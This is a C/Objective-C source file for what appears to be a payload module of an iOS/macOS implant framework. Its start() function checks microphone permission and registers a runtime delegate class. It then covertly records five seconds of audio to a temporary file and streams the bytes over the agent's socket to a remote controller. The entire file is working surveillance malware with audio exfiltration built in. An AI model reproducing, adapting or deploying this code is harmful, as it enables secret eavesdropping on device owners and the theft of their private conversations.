#include <payload.h>

static int AVAudioSessionRecordPermissionGranted = 'grnt';

typedef void AVAudioRecorder;
typedef void AVCaptureOutput;
typedef void AVCaptureConnection;
typedef void NSError;
typedef void* CMSampleBufferRef;
typedef void NSString;
typedef void AVCaptureDevice;
typedef void AVCaptureDeviceInput;
typedef void AVCaptureAudioDataOutput;
typedef void AVCaptureSession;
typedef void AVAssetWriter;
typedef void AVAssetWriterInput;

#define AVMediaTypeAudio CFSTR("soun")
#define AVCaptureSessionPresetLow CFSTR("AVCaptureSessionPresetLow")
#define AVFileTypeAppleM4A CFSTR("com.apple.m4a-audio")

#define DISPATCH_QUEUE_PRIORITY_DEFAULT 0

bool is_authorized(agent_p agent);

static id recorder_initWithAgent_(id self, SEL _cmd, agent_p agent)
{
    id __self = objcMsgSendSuper2Cast()(SUPER(self), objcGetSelector(init));

    log_info("Hello from delegate! %p", __self);

    return __self;
}

static void recorder_audioRecorderDidFinishRecording_successfully_(id self, SEL _cmd, AVAudioRecorder *rec, BOOL flag)
{
    agent_p agent = (agent_p)*(uint64_t*)((char*)getClass(self) + 48);
}

static void recorder_audioRecorderEncodeErrorDidOccur_error_(id self, SEL _cmd, AVAudioRecorder *rec, NSError* error)
{
    agent_p agent = (agent_p)*(uint64_t*)((char*)getClass(self) + 48);
    log_error("audioRecorderEncodeErrorDidOccur:%p error:%p", rec, error);
}

static void recorder_captureOutput_didOutputSampleBuffer_fromConnection_(id self, SEL _cmd, AVCaptureOutput *captureOutput, CMSampleBufferRef sampleBuffer, AVCaptureConnection *connection)
{
    agent_p agent = (agent_p)*(uint64_t*)((char*)getClass(self) + 48);

    Ivar ivar = classGetInstanceVariable(getClass(self), "_audioWriterInput");
    void* _audioWriterInput = (void*)objectGetIvar(self, ivar);

    objcMsgSendCast(void*)(_audioWriterInput, objcGetSelector(appendSampleBuffer:), sampleBuffer);
}

static void recorder_startRecordingToFile_(id self, SEL _cmd, NSString *path)
{
    agent_p agent = (agent_p)*(uint64_t*)((char*)getClass(self) + 48);

    NSError *error = nil;
    AVCaptureDevice *audioDevice = objcMsgSendCast(void*)(objcGetClass(AVCaptureDevice), objcGetSelector(defaultDeviceWithMediaType:), AVMediaTypeAudio);
    AVCaptureDeviceInput *audioInput = objcMsgSendCast(void*,void**)(objcGetClass(AVCaptureDeviceInput), objcGetSelector(deviceInputWithDevice:error:), audioDevice, &error);
    if (error) {
        log_info("error: %p", error);
    }
    AVCaptureAudioDataOutput *_audioOutput = objcAllocInitClass(AVCaptureAudioDataOutput);

    AVCaptureSession* _capSession = objcAllocInitClass(AVCaptureSession);

    objcMsgSendCast()(_capSession, objcGetSelector(retain));

    Ivar ivar = classGetInstanceVariable(getClass(self), "_capSession");
    objectSetIvar(self, ivar, (id)_capSession);

    objcMsgSendCast()(_capSession, objcGetSelector(beginConfiguration));
    if ((BOOL)objcMsgSendCast(void*)(_capSession, objcGetSelector(canAddInput:), audioInput)) {
        objcMsgSendCast(void*)(_capSession, objcGetSelector(addInput:), audioInput);
    } else {
        log_info("ERROR: can add input said no");
    }
    if ((BOOL)objcMsgSendCast(void*)(_capSession, objcGetSelector(canAddOutput:), _audioOutput)) {
        objcMsgSendCast(void*)(_capSession, objcGetSelector(addOutput:), _audioOutput);
    } else {
        log_info("ERROR: can add output said no");
    }

    objcMsgSendCast(void*)(_capSession, objcGetSelector(setSessionPreset:), AVCaptureSessionPresetLow);

    objcMsgSendCast(void*,void*)(_audioOutput, objcGetSelector(setSampleBufferDelegate:queue:), self, agent->trampoline.dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0));

    void* audioOutputSettings = objcMsgSendCast(void*)(_audioOutput, objcGetSelector(recommendedAudioSettingsForAssetWriterWithOutputFileType:), AVFileTypeAppleM4A);

    void* _audioWriterInput = objcMsgSendCast(void*, void*)(objcGetClass(AVAssetWriterInput), objcGetSelector(assetWriterInputWithMediaType:outputSettings:), AVMediaTypeAudio, audioOutputSettings);
    objcMsgSendCast()(_audioWriterInput, objcGetSelector(retain));
    objcMsgSendCast(BOOL)(_audioWriterInput, objcGetSelector(setExpectsMediaDataInRealTime:), YES);

    ivar = classGetInstanceVariable(getClass(self), "_audioWriterInput");
    objectSetIvar(self, ivar, (id)_audioWriterInput);

    agent->trampoline.remove(CSTRING(path));
    AVAssetWriter* writer = objcMsgSendCast(void*, void*, void**)(objcGetClass(AVAssetWriter), objcGetSelector(assetWriterWithURL:fileType:error:), objcMsgSendCast(void*)(objcGetClass(NSURL), objcGetSelector(fileURLWithPath:), path), AVFileTypeAppleM4A, &error);

    objcMsgSendCast()(writer, objcGetSelector(retain));

    ivar = classGetInstanceVariable(getClass(self), "_writer");
    objectSetIvar(self, ivar, (id)writer);

    if (error) {
        log_info("ERROR: %p", error);
    }
    objcMsgSendCast(void*)(writer, objcGetSelector(addInput:), _audioWriterInput);
    objcMsgSendCast()(writer, objcGetSelector(startWriting));
    typedef struct {
        int64_t value;
        int32_t timescale;
        uint32_t flags;
        int64_t epoch;
    } CMTime;
    CMTime kCMTimeZero = {0, 1, 1, 0};
    objcMsgSendCast(CMTime)(writer, objcGetSelector(startSessionAtSourceTime:), kCMTimeZero);

    objcMsgSendCast()(_capSession, objcGetSelector(commitConfiguration));

    objcMsgSendCast()(_capSession, objcGetSelector(startRunning));
}

static void recorder_stopRecording(id self, SEL _cmd)
{
    agent_p agent = (agent_p)*(uint64_t*)((char*)getClass(self) + 48);

    Ivar ivar = classGetInstanceVariable(getClass(self), "_audioWriterInput");
    void* _audioWriterInput = (void*)objectGetIvar(self, ivar);
    ivar = classGetInstanceVariable(getClass(self), "_capSession");
    void* _capSession = (void*)objectGetIvar(self, ivar);
    ivar = classGetInstanceVariable(getClass(self), "_writer");
    void* writer = (void*)objectGetIvar(self, ivar);

    objcMsgSendCast()(_audioWriterInput, objcGetSelector(markAsFinished));
    objcMsgSendCast()(_capSession, objcGetSelector(stopRunning));
    if (!(bool)objcMsgSendCast()(writer, objcGetSelector(finishWriting))) {
        log_error("%s: ERROR: couldn't write file?!", __func__);
    }
}

#define log2(x) ((x == 8) ? 3 : 2)

void start(void *entry, agent_p agent)
{
    bool ret = false;
    uint64_t size = 0;
    uint64_t sent = 0;
    uint8_t *buffer = NULL;

    log_info("Loading AVFoundation.framework");
    if (!objcLoadBundle("/System/Library/Frameworks/AVFoundation.framework")) {
        log_error("Failed to load AVFoundation.framework");
        goto fail;
    }

    log_info("Checking microphone authorization status");
    if (is_authorized(agent) == false) {
        log_info("Not authorized to access microphone, bailing..");
        goto fail;
    }

    log_info("Creating delegate helper class");

    void* class = objcAllocateClassPair((Class)objcGetClass(NSObject), "C0nRecorderDelegate", 16);

    *(uint64_t*)((char*)class + 48) = (uint64_t)agent;

    classAddIvar(class, "_audioWriterInput", sizeof(void*), log2(sizeof(void*)), "^v");
    classAddIvar(class, "_capSession", sizeof(void*), log2(sizeof(void*)), "^v");
    classAddIvar(class, "_writer", sizeof(void*), log2(sizeof(void*)), "^v");

    classAddMethod(
        class,
        objcGetSelector(initWithAgent:),
        (IMP)PTRAUTH_SIGN_UNAUTHENTICATED_LOCAL_FUNC(entry, recorder_initWithAgent_),
        "@@:@"
    );

    classAddMethod(
        class,
        objcGetSelector(startRecordingToFile:),
        (IMP)PTRAUTH_SIGN_UNAUTHENTICATED_LOCAL_FUNC(entry, recorder_startRecordingToFile_),
        "v@:@"
    );

    classAddMethod(
        class,
        objcGetSelector(stopRecording),
        (IMP)PTRAUTH_SIGN_UNAUTHENTICATED_LOCAL_FUNC(entry, recorder_stopRecording),
        "v@:"
    );

    classAddMethod(
        class,
        objcGetSelector(audioRecorderDidFinishRecording:successfully:),
        (IMP)PTRAUTH_SIGN_UNAUTHENTICATED_LOCAL_FUNC(entry, recorder_audioRecorderDidFinishRecording_successfully_),
        "v@:@B"
    );

    classAddMethod(
        class,
        objcGetSelector(audioRecorderEncodeErrorDidOccur:error:),
        (IMP)PTRAUTH_SIGN_UNAUTHENTICATED_LOCAL_FUNC(entry, recorder_audioRecorderEncodeErrorDidOccur_error_),
        "v@:@@"
    );

    classAddMethod(
        class,
        objcGetSelector(captureOutput:didOutputSampleBuffer:fromConnection:),
        (IMP)PTRAUTH_SIGN_UNAUTHENTICATED_LOCAL_FUNC(entry, recorder_captureOutput_didOutputSampleBuffer_fromConnection_),
        "v@:@@@"
    );

    objcRegisterClassPair(class);

    void* delegate = objcAllocClass(C0nRecorderDelegate);

    delegate = objcMsgSendCast(void*)(delegate, objcGetSelector(initWithAgent:), agent);

    void* tmpdir = agent->trampoline.NSTemporaryDirectory();
    void* path = objcMsgSendCast(void*)(tmpdir, objcGetSelector(stringByAppendingPathComponent:), CFSTR("audio.m4a"));
    char* c_path = CSTRING(path);

    log_info("Trying to record 5 seconds of audio to %s", c_path);

    //objcMsgSendCast(SEL,void*,BOOL)(delegate, objcGetSelector(performSelectorOnMainThread:withObject:waitUntilDone:), objcGetSelector(startRecordingToFile:), path, YES);
    objcMsgSendCast(void*)(delegate, objcGetSelector(startRecordingToFile:), path);

    agent->trampoline.sleep(5);

    //objcMsgSendCast(SEL,void*,BOOL)(delegate, objcGetSelector(performSelectorOnMainThread:withObject:waitUntilDone:), objcGetSelector(stopRecording), nil, YES);
    objcMsgSendCast()(delegate, objcGetSelector(stopRecording));

    struct stat fst;
    if (agent->trampoline.stat(c_path, &fst) == 0) {
        log_info("Successfully recorded %d bytes of audio", fst.st_size);
        int fd = agent->trampoline.open(CSTRING(path), O_RDONLY);
        if (fd > 0) {
            size = fst.st_size;
            buffer = agent->trampoline.malloc(4096);
            agent->trampoline.send(agent->fd, &size, sizeof(size), 0);
            while (1) {
                int r = agent->trampoline.read(fd, buffer, 4096);
                if (r > 0) {
                    agent->trampoline.send(agent->fd, buffer, r, 0);
                } else {
                    break;
                }
            }
            agent->trampoline.close(fd);
        }
    } else {
        log_error("ERROR: Recording failed?!");
        goto fail;
    }

    return;
fail:
    size = 0;
    agent->trampoline.send(agent->fd, &size, sizeof(size), 0);
}

bool is_authorized(agent_p agent)
{
    return (
        (int)objcMsgSendCast()(
            objcMsgSendCast()(
                objcGetClass(AVAudioSession),
                objcGetSelector(sharedInstance)
            ),
            objcGetSelector(recordPermission)
        ) == AVAudioSessionRecordPermissionGranted
    );
}
